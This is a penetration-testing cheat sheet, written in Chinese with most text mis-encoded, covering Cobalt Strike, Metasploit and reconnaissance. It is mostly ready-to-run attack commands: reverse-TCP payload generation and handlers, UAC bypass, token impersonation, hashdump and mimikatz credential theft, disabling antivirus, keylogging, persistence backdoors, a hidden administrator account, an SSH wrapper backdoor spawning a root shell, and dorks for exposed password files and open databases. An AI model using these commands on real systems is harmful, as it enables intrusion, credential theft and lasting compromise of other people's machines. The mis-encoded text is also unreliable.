# Speed-PenTestğŸ•¶
`æ¸—é€æ‰‹å†Œ`
[TOC]

<p align="center">
    <img src="https://i.imgur.com/LIAU2tE.jpg">
</p>

`æœ¬äººæ’°å†™çš„æ‰‹å†Œï¼Œä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ä½¿ç”¨æ–‡ä¸­çš„æŠ€æœ¯æºç ç”¨äºéæ³•ç”¨é€”ï¼Œä»»ä½•äººé€ æˆçš„ä»»ä½•è´Ÿé¢å½±å“ï¼Œä¸æœ¬äººæ— å…³ã€‚`

---

# 0ç‘å£«å†›åˆ€/å®‰å…¨å·¥å…·/æ¡†æ¶
## cobaltstrike
æœåŠ¡ç«¯
`./teamserver ä½ çš„IP ä½ çš„å¯†ç `
å®¢æˆ·ç«¯
`java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`
æˆ–
`javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

**çˆ†ç ´ cobaltstrike teamserver**
```bash
git clone https://github.com/ryanohoro/csbruter
cd csbruter
cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
```

**Reference**
- [cobalt strike å¿«é€Ÿä¸Šæ‰‹ [ ä¸€ ] - FreeBufä¸“æ Â·æ”»é˜²ä¹‹è·¯](https://www.freebuf.com/column/149236.html)
- [æ•™ä½ ä¿®æ”¹cobalt strikeçš„50050ç«¯å£ - 3HACK](https://www.3hack.com/note/96.html)
- [ryanohoro/csbruter: Cobalt Strike team server password brute force tool](https://github.com/ryanohoro/csbruter)

---

## metasploit
Q:Module database cache not built yet, using slow search
A:
```bash
service postgresql start
msfdb init
db_rebuild_cache
```

### meterpreter
**meterpreterå¿«é€Ÿä¸Šæ‰‹**
```bash
shell   #è·å–ç›®æ ‡ä¸»æœºçš„ cmd shell
getsystem #å‘½ä»¤å¯ä»¥ææƒåˆ°æœ¬åœ°ç³»ç»Ÿæƒé™
sysinfo #æ˜¾ç¤ºç³»ç»Ÿåï¼Œæ“ä½œç³»ç»Ÿï¼Œæ¶æ„å’Œè¯­è¨€ç­‰ã€‚
```

#### è·å–ä¼šè¯
**handler**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST
set LPORT
exploit -j  #åå°æ‰§è¡Œ
```

**cmdshell å‡çº§ä¸º meterpreter**
å¦‚æœæœ€å¼€å§‹è·å–çš„æ˜¯ cmdshellï¼Œåæ¥å‘ç°è¿™å°æœºå™¨éå¸¸é€‚åˆä½œä¸ºæµ‹è¯•å…¶å®ƒç»ˆç«¯çš„è·³æ¿ï¼Œè¿™ä¸ªæ—¶å€™ cmdshell çš„åŠŸèƒ½å·²ç»ä¸èƒ½æ»¡è¶³éœ€è¦ï¼Œå‡çº§æˆ meterpreter å°±ååˆ†æœ‰å¿…è¦ã€‚
`sessions -u "id"` å°†è¯¥ cmdshell å‡çº§æˆ meterpreter

#### ææƒ
**ç»•è¿‡ UAC**
é€šå¸¸ webshell çš„æƒé™éƒ½æ¯”è¾ƒä½ï¼Œèƒ½å¤Ÿæ‰§è¡Œçš„æ“ä½œæœ‰é™ï¼Œæ²¡æ³•æŸ¥çœ‹é‡è¦æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿä¿¡æ¯ã€æŠ“å–ç®¡ç†å‘˜å¯†ç å’Œ hashã€å®‰è£…ç‰¹æ®Šç¨‹åºç­‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è·å–ç³»ç»Ÿæ›´é«˜çš„æƒé™
```bash
use exploit/windows/local/bypassuac #ä¸€ç³»åˆ—éƒ½å¯ç”¨
use exploit/windows/local/bypassuac_eventvwr
sessions    #æŸ¥çœ‹ç›®å‰çš„session
sessions -k #æ€æ­»æ‰€æœ‰session
set session    #è®¾ä¸ºä½ éœ€è¦exploitçš„session
```

**åˆ©ç”¨ç³»ç»Ÿæ¼æ´ææƒ**
```bash
use exploit/windows/local/ms13_081_track_popup_menu #ä»¥ms13-081ä¸ºä¾‹
set session
```

#### è¿›ç¨‹è¿ç§»
å½“meterpreterå•ç‹¬ä½œä¸ºä¸€ä¸ªè¿›ç¨‹è¿è¡Œæ—¶å®¹æ˜“è¢«å‘ç°ï¼Œå¦‚æœå°†å®ƒå’Œç³»ç»Ÿç»å¸¸è¿è¡Œçš„è¿›ç¨‹è¿›è¡Œç»‘å®šï¼Œå°±èƒ½å¤Ÿå®ç°æŒä¹…åŒ–ã€‚
```bash
getpid  #æŸ¥çœ‹å½“å‰ä¼šè¯çš„è¿›ç¨‹id
ps  #æŸ¥çœ‹ç›®æ ‡è¿è¡Œçš„è¿›ç¨‹
migrate pid #ç»‘å®šè¿›ç¨‹
```

#### ä»¤ç‰Œå‡å†’
åœ¨ç”¨æˆ·ç™»å½• windows æ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„ session æˆ–è€… cookieã€‚

msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚
```bash
getuid  #æŸ¥çœ‹å½“å‰ç”¨æˆ·
use incognito   #è¿›å…¥è¯¥æ¨¡å—
list_tokens -u  #æŸ¥çœ‹å­˜åœ¨çš„ä»¤ç‰Œ
impersonate_token ç”¨æˆ·å  #ä»¤ç‰Œå‡å†’
#æ³¨æ„ç”¨æˆ·åçš„æ–œæ éœ€è¦å†™ä¸¤ä¸ªã€‚

getuid  #æŸ¥çœ‹æ˜¯å¦åˆ‡æ¢æˆåŠŸ
```

#### è·å–å‡­è¯
```bash
run hashdump

load mimikatz   #åŠ è½½mimikatzæ¨¡å—
wdigest
kerberos
```

#### æ“ä½œæ–‡ä»¶ç³»ç»Ÿ
**åŸºæœ¬æ“ä½œ**
```bash
lsï¼šåˆ—å‡ºå½“å‰è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚
pwd æˆ– getwdï¼šæŸ¥çœ‹å½“å‰è·¯å¾„
searchï¼šæœç´¢æ–‡ä»¶ï¼Œä½¿ç”¨search -hæŸ¥çœ‹å¸®åŠ©ã€‚
catï¼šæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæ¯”å¦‚cat test.txtã€‚
editï¼šç¼–è¾‘æˆ–è€…åˆ›å»ºæ–‡ä»¶ã€‚å’ŒLinuxç³»ç»Ÿçš„vmå‘½ä»¤ç±»ä¼¼ï¼ŒåŒæ ·é€‚ç”¨äºç›®æ ‡ç³»ç»Ÿæ˜¯windowsçš„æƒ…å†µã€‚
rmï¼šåˆ é™¤æ–‡ä»¶ã€‚
cdï¼šåˆ‡æ¢è·¯å¾„ã€‚
mkdirï¼šåˆ›å»ºæ–‡ä»¶å¤¹ã€‚
rmdirï¼šåˆ é™¤æ–‡ä»¶å¤¹ã€‚
getlwd æˆ– lpwdï¼šæŸ¥çœ‹è‡ªå·±ç³»ç»Ÿçš„å½“å‰è·¯å¾„ã€‚
lcdï¼šåˆ‡æ¢è‡ªå·±å½“å‰ç³»ç»Ÿçš„ç›®å½•ã€‚
llsï¼šæ˜¾ç¤ºè‡ªå·±å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚
```

**ä¸Šä¼ å’Œä¸‹è½½**
```bash
upload <file> <destination> #ä¸Šä¼ æ–‡ä»¶åˆ° Windows ä¸»æœº
#æ³¨æ„ï¼šä½¿ç”¨ -r å‚æ•°å¯ä»¥é€’å½’ä¸Šä¼ ä¸Šä¼ ç›®å½•å’Œæ–‡ä»¶

download <file> <path to save>  #ä» windows ä¸»æœºä¸‹è½½æ–‡ä»¶
#æ³¨æ„ï¼šWindows è·¯å¾„è¦ä½¿ç”¨åŒæ–œçº¿
#å¦‚æœæˆ‘ä»¬éœ€è¦é€’å½’ä¸‹è½½æ•´ä¸ªç›®å½•åŒ…æ‹¬å­ç›®å½•å’Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ download -rå‘½ä»¤
```

#### å…¶å®ƒæ“ä½œ
**å…³é—­é˜²ç—…æ¯’è½¯ä»¶**
`run killav`
`run post/windows/manage/killav`

**æ“ä½œè¿œç¨‹æ¡Œé¢**
`run post/windows/manage/enable_rdp` å¼€å¯è¿œç¨‹æ¡Œé¢
`run post/windows/manage/enable_rdp username=test password=test` æ·»åŠ è¿œç¨‹æ¡Œé¢çš„ç”¨æˆ·(åŒæ—¶ä¹Ÿä¼šå°†è¯¥ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„)

**æˆªå±**
`screenshot`

**é”®ç›˜è®°å½•**
```bash
keyscan_startï¼šå¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½
keyscan_dumpï¼šæ˜¾ç¤ºæ•æ‰åˆ°çš„é”®ç›˜è®°å½•ä¿¡æ¯
keyscan_stopï¼šåœæ­¢é”®ç›˜è®°å½•åŠŸèƒ½
```

**æ‰§è¡Œç¨‹åº**
```bash
execute -f <path> [options] åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œ exe æ–‡ä»¶
-Hï¼šåˆ›å»ºä¸€ä¸ªéšè—è¿›ç¨‹
-aï¼šä¼ é€’ç»™å‘½ä»¤çš„å‚æ•°
-iï¼šè·Ÿè¿›ç¨‹è¿›è¡Œäº¤äº’
-mï¼šä»å†…å­˜ä¸­æ‰§è¡Œ
-tï¼šä½¿ç”¨å½“å‰ä¼ªé€ çš„çº¿ç¨‹ä»¤ç‰Œè¿è¡Œè¿›ç¨‹
-sï¼šåœ¨ç»™å®šä¼šè¯ä¸­æ‰§è¡Œè¿›ç¨‹
```

#### ç«¯å£è½¬å‘å’Œå†…ç½‘ä»£ç†
**portfwd**
portfwd æ˜¯ meterpreter æä¾›çš„ç«¯å£è½¬å‘åŠŸèƒ½ï¼Œåœ¨ meterpreter ä¸‹ä½¿ç”¨ portfwd -h å‘½ä»¤æŸ¥çœ‹è¯¥å‘½ä»¤çš„å‚æ•°ã€‚
```bash
portfwd add -l 2222 -r 1.1.1.1 -p 3389 #å°†1.1.1.3çš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„2222ç«¯å£ã€‚
-lï¼šæœ¬åœ°ç›‘å¬ç«¯å£
-rï¼šå†…ç½‘ç›®æ ‡çš„ip
-pï¼šå†…ç½‘ç›®æ ‡çš„ç«¯å£
```

**pivot**
pivot æ˜¯ msf æœ€å¸¸ç”¨çš„ä»£ç†ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨ msf æä¾›çš„æ‰«ææ¨¡å—å¯¹å†…ç½‘è¿›è¡Œæ¢æµ‹ã€‚
```bash
route add å†…ç½‘ip å­ç½‘æ©ç  sessionçš„id #æ·»åŠ ä¸€ä¸ªè·¯ç”±
route print

å¦‚æœå…¶å®ƒç¨‹åºéœ€è¦è®¿é—®è¿™ä¸ªå†…ç½‘ç¯å¢ƒï¼Œå°±å¯ä»¥å»ºç«‹socksä»£ç†
msfæä¾›äº†3ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚
auxiliary/server/socks4a
auxiliary/server/socks5
auxiliary/server/socks_unc

use auxiliary/server/socks4a
SRVHOSTï¼šç›‘å¬çš„ipåœ°å€ï¼Œé»˜è®¤ä¸º0.0.0.0ï¼Œä¸€èˆ¬ä¸éœ€è¦æ›´æ”¹ã€‚
SRVPORTï¼šç›‘å¬çš„ç«¯å£ï¼Œé»˜è®¤ä¸º1080ã€‚
ç›´æ¥è¿è¡Œrunå‘½ä»¤ï¼Œå°±å¯ä»¥æˆåŠŸåˆ›å»ºä¸€ä¸ªsocks4ä»£ç†éš§é“ï¼Œåœ¨linuxä¸Šå¯ä»¥é…ç½®proxychainsä½¿ç”¨ï¼Œåœ¨windowså¯ä»¥é…ç½®Proxifierè¿›è¡Œä½¿ç”¨ã€‚
```

#### åé—¨
Meterpreterçš„shellè¿è¡Œåœ¨å†…å­˜ä¸­ï¼Œç›®æ ‡é‡å¯å°±ä¼šå¤±æ•ˆï¼Œå¦‚æœç®¡ç†å‘˜ç»™ç³»ç»Ÿæ‰“ä¸Šè¡¥ä¸ï¼Œé‚£ä¹ˆå°±æ²¡åŠæ³•å†æ¬¡ä½¿ç”¨exploitè·å–æƒé™ï¼Œæ‰€ä»¥éœ€è¦æŒä¹…çš„åé—¨å¯¹ç›®æ ‡è¿›è¡Œæ§åˆ¶
**metsvc**
```bash
run metsvc 
#å‘½ä»¤è¿è¡ŒæˆåŠŸåä¼šåœ¨ C:WindowsTEMP ç›®å½•ä¸‹æ–°å»ºéšæœºåç§°çš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢ç”Ÿæˆ3ä¸ªæ–‡ä»¶(metsvc.dllã€metsvc-server.exeã€metsvc.exe)
#åŒæ—¶ä¼šæ–°å»ºä¸€ä¸ªæœåŠ¡ï¼Œæ˜¾ç¤ºåç§°ä¸ºMeterpreterï¼ŒæœåŠ¡åç§°ä¸ºmetsvcï¼Œå¯åŠ¨ç±»å‹ä¸º"è‡ªåŠ¨",ç»‘å®šåœ¨31337ç«¯å£ã€‚

use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set rhost xxx.xxx.xxx.xxx
set lport 31337
```

**persistence**
```bash
run persistence -X -i 10 -r 192.168.1.9 -p 4444
-Aï¼šå®‰è£…åé—¨åï¼Œè‡ªåŠ¨å¯åŠ¨exploit/multi/handleræ¨¡å—è¿æ¥åé—¨
-Lï¼šè‡ªå¯åŠ¨è„šæœ¬çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º%TEMP%
-Pï¼šéœ€è¦ä½¿ç”¨çš„payloadï¼Œé»˜è®¤ä¸ºwindows/meterpreter/reverse_tcp
-Sï¼šä½œä¸ºä¸€ä¸ªæœåŠ¡åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œï¼ˆéœ€è¦SYSTEMæƒé™ï¼‰
-Tï¼šè¦ä½¿ç”¨çš„å¤‡ç”¨å¯æ‰§è¡Œæ¨¡æ¿
-Uï¼šç”¨æˆ·ç™»é™†æ—¶è¿è¡Œ
-Xï¼šç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œ
-iï¼šåé—¨æ¯éš”å¤šå°‘ç§’å°è¯•è¿æ¥æœåŠ¡ç«¯
-pï¼šæœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£
-rï¼šæœåŠ¡ç«¯ip
```

**Reference**
- [linux - Metasploit: Module database cache not built yet, using slow search - Server Fault](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Metasploitå…¥é—¨ç”¨æ³•ï¼ˆä¸»åŠ¨æ”»å‡»ï¼‰ - CSDNåšå®¢](https://blog.csdn.net/wsh19930305/article/details/72855660)
- [meterpreterå¿…çŸ¥å¿…ä¼šçš„15ä¸ªå‘½ä»¤](https://www.4hou.com/tools/14185.html)
- [èŒæ–°ç§‘æ™® æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•ç”¨MSFè¿›è¡Œåæ¸—é€æµ‹è¯•](https://www.anquanke.com/post/id/164525)

---

# 1Crypto
## å„ç§çˆ†ç ´


---

# 2Misc
## æƒé™ç»´æŒ/åä¾¦å¯Ÿ
### é€šç”¨
#### msfvenom
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f exe > ./vu.exe`

#### Veil
- **Installation**
```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/setup/
sudo ./setup.sh â€“c
sudo ./Veil.py
```

#### HERCULES
- **Installation**
```bash
ç¡®ä¿ç”µè„‘é‡Œæœ‰Go
git clone https://github.com/noosec/HERCULES.git
cd HERCULES
wget -c https://github.com/fatih/color
go get github.com/fatih/color
go run Setup.go
cp -rf /root/go/src/github.com /usr/lib/go-1.7/src/github.com
cd SOURCE/
go run HERCULES.go
```

#### ASWCrypter
#### VENOM
#### Metasploit
```bash
use evasion/windows/windows_defender_exe
set payload windows/x64/meterpreter/reverse_tcp
set lhost 
set lport
run
```

---

### win
#### åˆ›å»ºåé—¨è´¦å·
```bash
net user PHPNET$ 1234abcd~ /add #æ·»åŠ ç”¨æˆ·
#Windows çš„å¸å·åç§°åå¸¦ç€"$"ç¬¦å·æ—¶ï¼Œä¸ä¼šåœ¨ net user å‘½ä»¤ä¸­æ˜¾ç¤ºå‡ºå¸å·ä¿¡æ¯
net localgroup administrators PHPNET$ /add #å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†ç»„
net user PHPNET$ /del #åˆ é™¤ç”¨æˆ·

query user #æŸ¥çœ‹ä¼šè¯

logoff IDå· #è¸¢æ‰
```

### linux
#### åé—¨
**SSH wrapper**
SSH wrapperåé—¨ï¼Œæ²¡æœ‰å¼€æ”¾é¢å¤–çš„ç«¯å£ï¼Œåªè¦å¯¹æ–¹å¼€äº†SSHæœåŠ¡ï¼Œå°±èƒ½è¿œç¨‹è¿æ¥
```bash
cd /usr/sbin
mv sshd ../bin
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
/etc/init.d/sshd restart
```
æŠ±æ­‰ï¼Œå®é™…æµ‹è¯•æœªæˆåŠŸ

**Vegile**
This tool will set up your backdoor/rootkits when backdoor is already setup it will be hidden your specific process,unlimited your session in metasploit and transparent. Even when it is killed, it will re-run again. There will always be a procces which will run another process, so we can assume that this procces is unstopable like a Ghost in The Shell
```bash
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
```

### éšåŒ¿æ”»å‡»
#### ç«¯å£è½¬å‘
**ew**
é¸½

---

## ä¿¡æ¯æ”¶é›†
### æœç´¢å¼•æ“ Hacking
**google**
ä¾‹å­
```bash
inurl:tw
inurl:jp

inurl:editor/db/ 
inurl:eWebEditor/db/ 
inurl:bbs/data/ 
inurl:databackup/ 
inurl:blog/data/ 
inurl:\boke\data 
inurl:bbs/database/ 
inurl:conn.asp 
inc/conn.asp
Server.mapPath(".mdb")
allinurl:bbs data
filetype:mdb inurl:database
filetype:inc conn
inurl:data filetype:mdb
intitle:"index of" data

intitle:"index of" etc
intitle:"Index of" .sh_history
intitle:"Index of" .bash_history
intitle:"index of" passwd
intitle:"index of" people.lst
intitle:"index of" pwd.db
intitle:"index of" etc/shadow
intitle:"index of" spwd
intitle:"index of" master.passwd
intitle:"index of" htpasswd
inurl:service.pwd

site:218.87.21.*
inurl:è€è™æœº site:*.gov
```

**[Shodan](https://www.shodan.io)**
è¯­æ³•
```bash
hostnameï¼šæœç´¢æŒ‡å®šçš„ä¸»æœºæˆ–åŸŸåï¼Œä¾‹å¦‚ hostname:"google"
portï¼šæœç´¢æŒ‡å®šçš„ç«¯å£æˆ–æœåŠ¡ï¼Œä¾‹å¦‚ port:"21"
countryï¼šæœç´¢æŒ‡å®šçš„å›½å®¶ï¼Œä¾‹å¦‚ country:"CN"
cityï¼šæœç´¢æŒ‡å®šçš„åŸå¸‚ï¼Œä¾‹å¦‚ city:"Hefei"
orgï¼šæœç´¢æŒ‡å®šçš„ç»„ç»‡æˆ–å…¬å¸ï¼Œä¾‹å¦‚ org:"google"
ispï¼šæœç´¢æŒ‡å®šçš„ISPä¾›åº”å•†ï¼Œä¾‹å¦‚ isp:"China Telecom"
productï¼šæœç´¢æŒ‡å®šçš„æ“ä½œç³»ç»Ÿ/è½¯ä»¶/å¹³å°ï¼Œä¾‹å¦‚ product:"Apache httpd"
versionï¼šæœç´¢æŒ‡å®šçš„è½¯ä»¶ç‰ˆæœ¬ï¼Œä¾‹å¦‚ version:"1.6.2"
geoï¼šæœç´¢æŒ‡å®šçš„åœ°ç†ä½ç½®ï¼Œå‚æ•°ä¸ºç»çº¬åº¦ï¼Œä¾‹å¦‚ geo:"31.8639, 117.2808"
before/afterï¼šæœç´¢æŒ‡å®šæ”¶å½•æ—¶é—´å‰åçš„æ•°æ®ï¼Œæ ¼å¼ä¸ºdd-mm-yyï¼Œä¾‹å¦‚ before:"11-11-15"
netï¼šæœç´¢æŒ‡å®šçš„IPåœ°å€æˆ–å­ç½‘ï¼Œä¾‹å¦‚ net:"210.45.240.0/24"
```

ä¾‹å­
```bash
#å‹æƒ…æé†’,ä¸è¦çæ
misc
Server: uc-httpd 1.0.0 200 OK Country:"JP"
h3c net:"61.191.146.0/24"
country:US vuln:CVE-2014-0160
port:135,139,445 -hash:0   #è¿‡æ»¤ä¸€äº›ä¸»æ–‡æœ¬æ ‡é¢˜ä¸ºç©ºçš„æœç´¢ç»“æœ
Hikvision-Webs

database
all:"mongodb server information" all:"metrics"  
port:27017 -all:"partially" all:"fs.files"      
port:"9200" all:"elastic indices"   

ftp
230 'anonymous@' login ok      

vnc
port:5900 screenshot.label:loggedin
```

å¤–éƒ¨å·¥å…·
```bash
Shodan cli
https://cli.shodan.io/

æµè§ˆå™¨æ’ä»¶
https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap
https://addons.mozilla.org/en-US/firefox/addon/shodan_io/

Metasploit
use auxiliary/gather/shodan_search
set SHODAN_APIKEY ********************
set QUERY ****

use auxiliary/gather/shodan_honeyscore  #èœœç½æ£€æµ‹
set SHODAN_APIKEY ********************
set TARGET your_target

Recon-ng
keys add shodan_api ********************
use recon/domains-hosts/shodan_hostname
show options
set SOURCE google
set LIMIT 1
```

**[censys](https://www.censys.io)**
ä¾‹å­
```bash
23.0.0.0/8 or 8.8.8.0/24ã€€ã€€å¯ä»¥ä½¿ç”¨and or not
80.http.get.status_code: 200ã€€ã€€æŒ‡å®šçŠ¶æ€
80.http.get.status_code:[200 TO 300]ã€€ã€€200-300ä¹‹é—´çš„çŠ¶æ€ç 
location.country_code: DEã€€ã€€å›½å®¶
protocols: (â€œ23/telnet" or â€œ21/ftp")ã€€ã€€åè®®
tags: scadaã€€ã€€æ ‡ç­¾
80.http.get.headers.serverï¼šnginxã€€ã€€æœåŠ¡å™¨ç±»å‹ç‰ˆæœ¬
autonomous_system.description: Universityã€€ã€€ç³»ç»Ÿæè¿°
```

**[é’Ÿé¦—ä¹‹çœ¼](https://www.zoomeye.org/)**
è¯­æ³•
```bash
app:nginxã€€ã€€ç»„ä»¶å
ver:1.0ã€€ã€€ç‰ˆæœ¬
os:windowsã€€ã€€æ“ä½œç³»ç»Ÿ
country:"China"ã€€ã€€å›½å®¶
city:"hangzhou"ã€€ã€€åŸå¸‚
port:80ã€€ã€€ç«¯å£
hostname:googleã€€ã€€ä¸»æœºå
site:google.comã€€ã€€ç½‘ç«™åŸŸå
desc:nmaskã€€ã€€æè¿°
keywords:passwdã€€ã€€å…³é”®è¯
service:ftpã€€ã€€æœåŠ¡ç±»å‹
ip:8.8.8.8ã€€ã€€ipåœ°å€
cidr:8.8.8.8/24ã€€ã€€ipåœ°å€æ®µ
```

**[FoFa](https://fofa.so)**
è¯­æ³•
```bash
title="abc" ä»æ ‡é¢˜ä¸­æœç´¢abcã€‚ä¾‹ï¼šæ ‡é¢˜ä¸­æœ‰åŒ—äº¬çš„ç½‘ç«™ã€‚
header="abc" ä»httpå¤´ä¸­æœç´¢abcã€‚ä¾‹ï¼šjbossæœåŠ¡å™¨ã€‚
body="abc" ä»htmlæ­£æ–‡ä¸­æœç´¢abcã€‚ä¾‹ï¼šæ­£æ–‡åŒ…å«Hacked byã€‚
domain="qq.com" æœç´¢æ ¹åŸŸåå¸¦æœ‰qq.comçš„ç½‘ç«™ã€‚ä¾‹ï¼š æ ¹åŸŸåæ˜¯qq.comçš„ç½‘ç«™ã€‚
host=".gov.cn" ä»urlä¸­æœç´¢.gov.cn,æ³¨æ„æœç´¢è¦ç”¨hostä½œä¸ºåç§°ã€‚
port="443" æŸ¥æ‰¾å¯¹åº”443ç«¯å£çš„èµ„äº§ã€‚ä¾‹ï¼š æŸ¥æ‰¾å¯¹åº”443ç«¯å£çš„èµ„äº§ã€‚
ip="1.1.1.1" ä»ipä¸­æœç´¢åŒ…å«1.1.1.1çš„ç½‘ç«™,æ³¨æ„æœç´¢è¦ç”¨ipä½œä¸ºåç§°ã€‚
protocol="https" æœç´¢åˆ¶å®šåè®®ç±»å‹(åœ¨å¼€å¯ç«¯å£æ‰«æçš„æƒ…å†µä¸‹æœ‰æ•ˆ)ã€‚ä¾‹ï¼š æŸ¥è¯¢httpsåè®®èµ„äº§ã€‚
city="Beijing" æœç´¢æŒ‡å®šåŸå¸‚çš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šåŸå¸‚çš„èµ„äº§ã€‚
region="Zhejiang" æœç´¢æŒ‡å®šè¡Œæ”¿åŒºçš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šè¡Œæ”¿åŒºçš„èµ„äº§ã€‚
country="CN" æœç´¢æŒ‡å®šå›½å®¶(ç¼–ç )çš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šå›½å®¶(ç¼–ç )çš„èµ„äº§ã€‚
cert="google.com" æœç´¢è¯ä¹¦(httpsæˆ–è€…imapsç­‰)ä¸­å¸¦æœ‰google.comçš„èµ„äº§ã€‚
```

ä¾‹å­
```bash
title="powered by" && title!=discuz
title!="powered by" && body=discuz
(body="content=\"WordPress" || (header="X-Pingback" && header="/xmlrpc.php" && body="/wp-includes/") ) && host="gov.cn"
```

**[Dnsdb](https://www.dnsdb.io/)**
è¯­æ³•
```bash
DnsDBæŸ¥è¯¢è¯­æ³•ç»“æ„ä¸ºæ¡ä»¶1 æ¡ä»¶2 æ¡ä»¶3 â€¦., æ¯ä¸ªæ¡ä»¶ä»¥ç©ºæ ¼é—´éš”, DnsDB ä¼šæŠŠæ»¡è¶³æ‰€æœ‰æŸ¥è¯¢æ¡ä»¶çš„ç»“æœè¿”å›ç»™ç”¨æˆ·.
```

åŸŸåæŸ¥è¯¢æ¡ä»¶
æŸ¥è¯¢è¯­æ³•ä¸º`domain:.`
åŸŸåæŸ¥è¯¢æ˜¯æŒ‡æŸ¥è¯¢é¡¶çº§ç§æœ‰åŸŸåæ‰€æœ‰çš„DNSè®°å½•,
ä¾‹å¦‚æŸ¥è¯¢google.com çš„æ‰€æœ‰DNSè®°å½•: `domain:google.com.`
åŸŸåæŸ¥è¯¢å¯ä»¥çœç•¥domain:.

ä¸»æœºæŸ¥è¯¢æ¡ä»¶
æŸ¥è¯¢è¯­æ³•:`host:`
ä¾‹å¦‚æŸ¥è¯¢ä¸»æœºåœ°å€ä¸ºmp3.example.comçš„DNSè®°å½•:`host:map3.example.com`
ä¸»æœºæŸ¥è¯¢æ¡ä»¶ä¸åŸŸåæŸ¥è¯¢æŸ¥è¯¢æ¡ä»¶çš„åŒºåˆ«åœ¨äº, ä¸»æœºæŸ¥è¯¢åŒ¹é…çš„æ˜¯DNSè®°å½•çš„Hostå€¼

æŒ‰DNSè®°å½•ç±»å‹æŸ¥è¯¢
æŸ¥è¯¢è¯­æ³•: `type:.`
ä¾‹å¦‚åªæŸ¥è¯¢Aè®°å½•: `type:a`
ä½¿ç”¨æ¡ä»¶:å¿…é¡»å­˜åœ¨domain:æˆ–è€…host:æ¡ä»¶,æ‰å¯ä»¥ä½¿ç”¨type:æŸ¥è¯¢è¯­æ³•

æŒ‰IPé™åˆ¶
æŸ¥è¯¢è¯­æ³•: `ip:`
æŸ¥è¯¢æŒ‡å®šIP: `ip:8.8.8.8` è¯¥æŸ¥è¯¢ä¸ç›´æ¥è¾“å…¥8.8.8.8è¿›è¡ŒæŸ¥è¯¢ç­‰æ•ˆ
æŸ¥è¯¢æŒ‡å®šIPèŒƒå›´: `ip:8.8.8.8-8.8.255.255`
CIDR: `ip:8.8.0.0/24`
IPæœ€å¤§èŒƒå›´é™åˆ¶65536ä¸ª

ä¾‹å­
æŸ¥è¯¢google.comçš„æ‰€æœ‰Aè®°å½•: `google.com type:a`

**Reference**
- [ã€æ¸—é€ç¥å™¨ç³»åˆ—ã€‘æœç´¢å¼•æ“](https://thief.one/2017/05/19/1/)
- [Shodanæ–°æ‰‹å…¥å‘æŒ‡å—](https://www.freebuf.com/sectool/121339.html)
- [shodan-manual](https://b404.gitbooks.io/shodan-manual/)
- [How to Discover MongoDB and Elasticsearch Open Databases](https://habr.com/en/post/443132/)

### ç½‘ç»œ
